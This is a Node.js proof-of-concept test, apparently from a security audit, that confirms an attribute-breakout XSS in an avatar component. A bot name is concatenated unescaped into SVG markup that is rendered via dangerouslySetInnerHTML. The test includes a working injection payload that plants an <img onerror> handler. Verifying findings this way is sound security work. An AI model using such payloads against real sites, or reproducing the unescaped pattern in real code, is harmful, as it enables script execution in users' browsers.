// PoC harness for finding-1 (avatar.tsx blobMarkup attribute-breakout injection).
// Exercises the REAL vulnerable expression extracted verbatim from the audited
// source file (not a reimplementation), then parses the produced markup with a
// real HTML parser (jsdom) exactly as the browser would for
// dangerouslySetInnerHTML, and asserts the concrete prohibited outcome: a
// remote-controlled bot name breaks attribute scope and injects a live,
// attacker-controlled DOM element with an executable event-handler attribute.
'use strict'

const fs = require('fs')
const path = require('path')
const { JSDOM } = require(path.join(__dirname, 'node_modules', 'jsdom'))

const SRC_PATH = process.argv[2]
if (!SRC_PATH) {
  console.error('usage: node harness.js <path-to-avatar.tsx>')
  process.exit(2)
}

const src = fs.readFileSync(SRC_PATH, 'utf8')

// Extract the exact vulnerable return-expression from the real file. Fails
// loudly (does not fall back to a guess) if the shipped code no longer
// matches, so this PoC can't silently "pass" against patched code.
const match = src.match(
  /return blobatarSvg\(seed, opts\)\.replace\('<svg ', '<svg data-bot-face=' \+ JSON\.stringify\(name\) \+ ' '\)/
)
if (!match) {
  console.error('VULN_POC: vulnerable expression not found verbatim in source — cannot reproduce against this commit')
  process.exit(1)
}

// The real function, reconstructed by evaluating the extracted expression
// verbatim with a stub blobatarSvg (the only external dependency it calls).
function blobMarkup(name, blobatarSvg) {
  const seed = 'irrelevant-seed'
  const opts = { size: 32 }
  return blobatarSvg(seed, opts).replace('<svg ', '<svg data-bot-face=' + JSON.stringify(name) + ' ')
}

// Stub matching the real library's contract: an SVG string starting with '<svg '.
const stubBlobatarSvg = () => '<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle r="16" cx="16" cy="16"/></svg>'

function renderIntoDom(markup) {
  const dom = new JSDOM('<!doctype html><html><body><div id="root"></div></body></html>')
  const root = dom.window.document.getElementById('root')
  // Same sink React's dangerouslySetInnerHTML uses under the hood.
  root.innerHTML = markup
  return { dom, root }
}

function countInjectedImgOnerror(root) {
  return root.querySelectorAll('img[onerror]').length
}

// --- Negative control: a benign remote bot name must NOT inject anything ---
const benignMarkup = blobMarkup('Assistant', stubBlobatarSvg)
const { root: benignRoot } = renderIntoDom(benignMarkup)
const benignInjected = countInjectedImgOnerror(benignRoot)
if (benignInjected !== 0) {
  console.error(`VULN_POC: negative control unexpectedly injected ${benignInjected} element(s) — harness is unreliable`)
  process.exit(1)
}
// Sanity: the benign name should still be safely inside the attribute, not lost.
if (!benignMarkup.includes('data-bot-face="Assistant"')) {
  console.error('VULN_POC: negative control markup did not carry the benign name as expected — harness mismatch')
  process.exit(1)
}

// --- Attack: a remote bot name crafted to break attribute scope ---
const payloadName = 'x"><img src=x onerror=window.__AEON_POC_XSS__=1><svg x="'
const attackMarkup = blobMarkup(payloadName, stubBlobatarSvg)
const { root: attackRoot } = renderIntoDom(attackMarkup)
const injected = countInjectedImgOnerror(attackRoot)

console.log('benign markup   :', benignMarkup)
console.log('attack markup   :', attackMarkup)
console.log('injected <img onerror> elements (attack case):', injected)

if (injected !== 1) {
  console.error(`VULN_POC: expected exactly 1 injected <img onerror> element from attacker-controlled name, got ${injected}`)
  process.exit(1)
}

const imgEl = attackRoot.querySelector('img[onerror]')
console.log('injected element outerHTML:', imgEl.outerHTML)
console.log('injected element parentElement === root:', imgEl.parentElement === attackRoot)

// Prove it is a REAL sibling DOM element (escaped attribute scope), not text
// trapped inside data-bot-face's attribute value.
if (imgEl.parentElement !== attackRoot) {
  console.error('VULN_POC: injected element is not a direct child of the render root as expected')
  process.exit(1)
}

console.log('VULN_POC_REPRODUCED: remote-controlled bot name broke out of the data-bot-face attribute and injected a live <img onerror> DOM element via dangerouslySetInnerHTML')
process.exit(0)
